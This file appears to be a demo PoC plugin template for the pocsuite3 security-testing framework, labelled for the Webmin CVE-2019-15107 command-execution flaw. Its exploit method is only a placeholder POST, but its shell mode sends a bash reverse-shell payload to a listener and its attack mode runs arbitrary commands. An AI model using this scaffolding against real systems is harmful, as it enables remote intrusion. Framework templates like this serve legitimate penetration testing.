#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 建议统一从 pocsuite3.api 导入
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)

# 限定框架版本，避免在老的框架上运行新的 PoC 插件
minimum_version_required('1.9.6')


# DemoPOC 类，继承自基类 POCBase
class DemoPOC(POCBase):
	 # PoC 和漏洞的属性信息
    vulID = '98060'
    version = '1'
    author = 'Seebug'
    vulDate = '2019-08-19'
    createDate = '2022-07-11'
    updateDate = '2022-07-11'
    references = ['https://www.seebug.org/vuldb/ssvid-98060']
    name = 'Webmin <=1.920 Pre-Auth Command Execution (CVE-2019-15107)'
    appPowerLink = 'https://www.webmin.com'
    appName = 'Webmin'
    appVersion = '<=1.920'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    samples = ['']  # 测试样列，就是用 PoC 测试成功的目标
    install_requires = ['']  # PoC 第三方模块依赖
    pocDesc = 'User manual of poc'
    # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

	# 定义额外的命令行参数，用于 attack 模式
    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('uname -a', description='The command to execute')
        return o

	# 漏洞的核心方法
    def _exploit(self, param=''):
        # 使用 self._check() 方法检查目标是否存活，是否是关键词蜜罐。
        if not self._check(dork=''):
            return False

        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = 'a=b'
        res = requests.post(self.url, headers=headers, data=payload)
        logger.debug(res.text)
        return res.text

	# verify 模式的实现
    def _verify(self):
        result = {}
        flag = random_str(6)
        param = f'echo {flag}'
        res = self._exploit(param)
        if res and flag in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
        # 统一调用 self.parse_output() 返回结果
        return self.parse_output(result)

	# attack 模式的实现
    def _attack(self):
        result = {}
        # self.get_option() 方法可以获取自定义的命令行参数
        param = self.get_option('cmd')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        # 统一调用 self.parse_output() 返回结果
        return self.parse_output(result)

	 # shell 模式的实现
    def _shell(self):
        try:
            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
        except Exception:
            pass


# 将该 PoC 注册到框架。
register_poc(DemoPOC)

